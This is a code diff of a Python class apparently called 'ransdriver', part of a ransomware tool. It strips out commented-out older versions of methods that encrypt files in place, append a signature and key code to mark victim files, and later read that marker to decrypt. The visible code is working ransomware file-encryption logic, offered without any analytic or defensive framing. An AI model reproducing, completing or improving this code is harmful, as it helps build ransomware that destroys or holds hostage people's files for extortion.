@@ -34,21 +34,7 @@ class ransdriver:
                         key_code = data[i:-len(self.__EOF_signature)]
                         break
         return key_code
-        """
-        key_code = ''.encode('utf-8')
-        with open(file_path, 'rb') as file:
-            point = min(len(self.__file_signature)*2+8, self._file_manager.get_size(file_path))
-            file.seek(-point, 2)
-            data = file.read().rstrip('\n'.encode('utf-8'))
-            if data[-len(self.__file_signature):] == self.__file_signature:
-                for i in range(-len(self.__file_signature), -len(data), -1):
-                    if data[i-len(self.__file_signature):i] == self.__file_signature:
-                        key_code = data[i:-len(self.__file_signature)]
-                        self.__EOF_pointer = file.tell()+i-len(self.__file_signature)
-                        break
-        return key_code
-        """
-    
+
     def encrypt_file(self,
                      file_path:str,
                      cryption_key:bytes) -> tuple:
@@ -75,19 +61,6 @@ class ransdriver:
         
         self.__key_code += 1
         return self.__cryptor.return_key_bytes('sym_file_key'), key_code
-        """
-        
-        key_code = str(self.__key_code).encode('utf-8')
-        self.__cryptor.register_key('sym_file_key', 'symetric', cryption_key)
-        
-        with open(file_path, 'r+b') as file:
-            self.__data = file.read()
-            self.__data = self.__cryptor.encrypt('sym_file_key', self.__data) + self.__file_signature + key_code + self.__file_signature
-            file.seek(0)
-            file.write(self.__data)
-        self.__key_code += 1
-        return self.__cryptor.return_key_bytes('sym_file_key'), key_code
-        """
 
     def decrypt_file(self,
                      file_path:str,
@@ -118,17 +91,6 @@ class ransdriver:
         self._file_manager.replace_file(self.__tmp_file, file_path)
         
         return 'decrypted'.encode('utf-8')
-        """
-        self.__cryptor.register_key('sym_file_key', 'symetric', cryption_key)
-        
-        with open(file_path, 'r+b') as file:
-            self.__data = file.read(self.__EOF_pointer)
-            self.__data = self.__cryptor.decrypt('sym_file_key', self.__data)
-            file.seek(0)
-            file.write(self.__data)
-            file.truncate()
-        return 'decrypted'.encode('utf-8')
-        """
     
     def Encrypt(self, arguments:dict) -> iter:
         """
